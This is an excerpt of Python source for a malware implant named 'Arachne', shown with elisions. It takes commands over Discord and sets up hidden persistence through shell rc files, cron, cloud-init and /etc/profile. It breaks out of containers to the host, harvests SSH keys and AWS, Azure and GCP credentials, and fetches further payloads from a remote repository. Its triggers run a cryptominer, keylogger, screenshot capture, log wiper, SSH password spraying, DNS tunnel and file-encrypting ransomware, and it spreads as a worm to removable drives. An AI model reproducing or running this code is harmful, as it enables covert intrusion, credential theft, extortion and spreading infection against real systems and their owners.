...
HIDDEN_DIR = os.path.expanduser("~/.cache/.arachne")
...
DISCORD_COMMAND_URL = (
    "https://discord.com/api/v10/channels/1324352009928376462688/messages?limit=1"
)
...
BOT_TOKEN = (
    "MTM4ODk4Mmnru^&676hhbzOTkyNTQ5OA.G7d-oM.T2IM_m_GcgH5z76GBFuuc53782jdhfdiI8GeS8U"
)
...
class CloudAwareImplant:
            ...
            for indicator in azure_indicators:
                if os.path.exists(indicator):
                    with open(indicator, "r") as f:
                        ...
                        if (
                            "microsoft" in content
                            or "azure" in content
                            or "7783-7084-3265-9085-8269-3286-77" in content
                        ):
                            return {"provider": "azure", "is_cloud": True, "type": "vm"}
        return None
        ...
        if os.path.exists("/proc/1/cgroup"):
            with open("/proc/1/cgroup", "r") as f:
                ...
                if any(
                    ...
                    for indicator in ["containerd", "crio", "podman", "kubepods"]
                ):
                    return {
                        "provider": "container",
                        "is_cloud": True,
    ...
    def _get_recommended_tactics(self):
        ...
        tactics["persistence"].extend(
            ["cloud_init_modification", "cron_cloud_metadata"]
        )
        tactics["collection"].extend(
            ["cloud_metadata_collection", "credential_harvesting"]
        )
        ...
        if provider == "aws":
            tactics["collection"].extend(
                ["aws_credential_harvesting", "aws_metadata_exfiltration"]
            )
            tactics["payloads"].extend(["aws_credential_stealer.py", "s3_scanner.py"])

        elif provider == "azure":
            tactics["collection"].extend(
                ["azure_managed_identity_harvesting", "azure_metadata_collection"]
            )
            tactics["payloads"].extend(
                ["azure_cred_harvester.py", "key_vault_scanner.py"]
            )

        elif provider == "gcp":
            tactics["collection"].extend(
                ["gcp_service_account_harvesting", "gcp_metadata_collection"]
            )
            tactics["payloads"].extend(
                ["gcp_cred_harvester.py", "gcp_bucket_scanner.py"]
            )

        elif provider in ["docker", "kubernetes", "container"]:
            tactics["persistence"].extend(
                ["container_image_modification", "kubernetes_cronjob"]
            )
            tactics["collection"].extend(
                ["container_breakout_attempt", "kubernetes_secret_harvesting"]
            )
            tactics["evasion"].extend(
                ["container_fileless_execution", "memory_only_persistence"]
            )
    ...
    def setup_aws_persistence(self):
            ...
            if os.path.exists(path):
                try:
                    ...
                    with open(path, "a") as f:
                        ...
                        f.write(f"echo 'export ARACHNE_LAUNCHED=1' >> /etc/profile\n")
                        f.write(
                            f"(cd {HIDDEN_DIR} && nohup python3 arachne_implant.py >/dev/null 2>&1 &)\n"
                        )
        ...
        cron_cmd = f"0 * * * * root curl -s http://169.254.169.254/latest/meta-data/instance-id >/dev/null && cd {HIDDEN_DIR} && python3 arachne_implant.py &\n"
...
(cd {HIDDEN_DIR} && nohup python3 arachne_implant.py >/dev/null 2>&1 &)
""")
...
runcmd:
  - [bash, -c, "cd {HIDDEN_DIR} && nohup python3 arachne_implant.py >/dev/null 2>&1 &"]
""")
...
bootcmd:
  - [bash, -c, "cd {HIDDEN_DIR} && python3 arachne_implant.py &"]
""")
...
docker run --rm -v /:/host alpine sh -c "
    cp {HIDDEN_DIR}/arachne_implant.py /host/tmp/ &&
    echo 'nohup python3 /tmp/arachne_implant.py &' >> /host/etc/profile
"
""")
...
IMPLANT_URL="{PAYLOAD_REPO}arachne_implant.py"
        ...
        try:
            ...
            try:
                ...
                if role:
                    ...
                    results.append(
                        f"Secret Key: {cred_data.get('SecretAccessKey')[:20]}..."
                    )
            except:
                pass
    ...
    def container_recon(self):
        ...
        if os.path.exists("/proc/1/cgroup"):
            with open("/proc/1/cgroup", "r") as f:
                results.append("\n[cgroups]")
                results.append(
                    f.read()[:500] + "..." if len(f.read()) > 500 else f.read()
                )
...
def should_run_silently():
    ...
    if os.environ.get("ARACHNE_LAUNCHED") == "1":
        return True
    try:
        ppid = os.getppid()
            ...
            if dir_match:
                ...
                for path in interesting_paths:
                    if os.path.exists(path):
                        ...
                        summary += (
                            f"[+] Found {count} items in {os.path.basename(path)}\n"
                        )
...
def handle_trigger(cmd):
    ...
    # === EXISTING TRIGGERS ===
        ...
        return subprocess.getoutput(
            "pgrep -f mine.py && pkill -f mine.py || echo '[-] No miner running.'"
        )
    ...
    # === NEW TRIGGERS FOR ENHANCED PAYLOAD SUITE ===
        ...
        if len(parts) > 1 and parts[1] == "stop":
            ...
            return subprocess.getoutput(
                "pgrep -f keylogger.py && pkill -f keylogger.py || echo '[-] No keylogger running.'"
            )
        else:
        ...
        if len(parts) > 1 and parts[1] == "stop":
            ...
            return subprocess.getoutput(
                "pgrep -f screenshot.py && pkill -f screenshot.py || echo '[-] No screenshot capture running.'"
            )
        else:
        ...
        if len(parts) > 1:
            ...
            if parts[1] == "all":
                ...
                return subprocess.getoutput(
                    f"python3 {os.path.join(HIDDEN_DIR, 'logcleaner.py')} --all"
                )
            else:
                print(f"[+] Cleaning logs: {parts[1]}")
                return subprocess.getoutput(
                    f"python3 {os.path.join(HIDDEN_DIR, 'logcleaner.py')} {parts[1]}"
                )
        else:
            fetch_payload("logcleaner.py")
        ...
        if len(parts) > 1:
            ...
            if len(parts) >= 4:
                ...
                return subprocess.getoutput(
                    f"python3 {os.path.join(HIDDEN_DIR, 'sshspray.py')} {target} {userlist} {passlist}"
                )
            else:
        ...
        if len(parts) > 1 and parts[1] == "stop":
            ...
            return subprocess.getoutput(
                "pgrep -f dnstunnel.py && pkill -f dnstunnel.py || echo '[-] No DNS tunnel running.'"
            )
        else:
    ...
    # === FILE ENCRYPTION PAYLOAD ===
        ...
        if action == "encrypt":
            ...
            if target == "system_wide":
                ...
                if len(parts) < 4:
                    return (
                        "[!] Usage: trigger_fileransom decrypt system_wide <password>"
                    )
    ...
    # === COMPOUND TRIGGERS ===
        ...
        # SSH keys
        results.append("\n[3] SSH Keys:")
        ssh_keys = subprocess.getoutput(
            "find /home /root -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null"
        )
        results.append(ssh_keys[:2000])

        # Configuration files
        results.append("\n[4] Configuration Files:")
        config_files = subprocess.getoutput(
            "find /etc -name '*.conf' -o -name '*.cfg' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' 2>/dev/null | head -20"
        )
    ...
    # === UTILITY TRIGGERS ===
        ...
        status.append(
            f"Network Connections: {len(subprocess.getoutput('netstat -tunap 2>/dev/null | grep ESTABLISHED').splitlines())} established"
        )

        # Cloud info if available
        if cloud_implant.cloud_info and cloud_implant.cloud_info.get("is_cloud"):
            status.append(
                f"Cloud Environment: {cloud_implant.cloud_info.get('provider', 'unknown').upper()}"
            )
            status.append(
                f"Cloud Type: {cloud_implant.cloud_info.get('type', 'unknown')}"
            )
        ...
        try:
            ...
            url = f"{PAYLOAD_REPO}arachne_implant.py"
            req = urllib.request.Request(
                url,
                headers={
                    "User-Agent": f"Arachne-Implant/{IMPLANT_ID_HASH}",
            ...
            temp_file = os.path.join(HIDDEN_DIR, "arachne_implant_new.py")
        ...
        help_text = """
=== ARACHNE IMPLANT TRIGGER COMMANDS ===
...
def handle_command(cmd):
    if cmd.startswith("load_payload"):
        ...
        return (
            f"[+] Fetched {payload_name}"
            if result
            else f"[!] Failed to fetch {payload_name}"
        )
...
def setup_persistence():
    ...
    target = os.path.join(HIDDEN_DIR, ".arachne_agent.py")

    if not os.path.exists(target):
        shutil.copy(__file__, target)

        persistence_script = f"""if [ -z "${{ARACHNE_LAUNCHED+x}}" ]; then
    export ARACHNE_LAUNCHED=1
...
def worm_propagate():
    ...
    try:
        drives = subprocess.getoutput(
            "lsblk -o MOUNTPOINT -nr | grep -v '^$'"
        ).splitlines()
        for mount in drives:
            if "/media" in mount or "/run/media" in mount:
                try:
                    worm_dir = os.path.join(mount.strip(), ".arachne_worm")
                    os.makedirs(worm_dir, exist_ok=True)
                    shutil.copy(__file__, os.path.join(worm_dir, "arachne_implant.py"))
                    with open(os.path.join(worm_dir, ".bash_login"), "w") as f:
                        f.write(
                            f'if [ -z "${{ARACHNE_WORM_LAUNCHED+x}}" ]; then export ARACHNE_WORM_LAUNCHED=1; (cd {worm_dir} && nohup python3 arachne_implant.py >/dev/null 2>&1 &); fi\n'
                        )
    ...
    for rc_file in rc_files:
        ...
        if os.path.exists(rc_path):
            ...
            new_lines = [
                line
                for line in lines
                if "arachne_agent.py" not in line and "System maintenance" not in line
            ]
